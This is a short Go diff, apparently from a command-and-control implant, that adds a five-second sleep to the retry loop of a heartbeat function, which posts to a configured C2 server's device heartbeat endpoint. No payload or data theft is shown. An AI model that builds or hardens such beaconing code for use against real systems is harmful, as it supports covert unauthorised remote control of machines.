@@ -103,6 +103,7 @@ func Heartbeat() {
 		req, err := http.NewRequest("POST", "http://"+config.Config.C2+":8000/api/devices/heartbeat", responseBody)
 		if err != nil {
 			log.Logger.Error().Msgf("[X]\tError in http request.\n[ERROR] -  \n", err)
+			time.Sleep(time.Second * 5)
 			goto loop
 		}
 
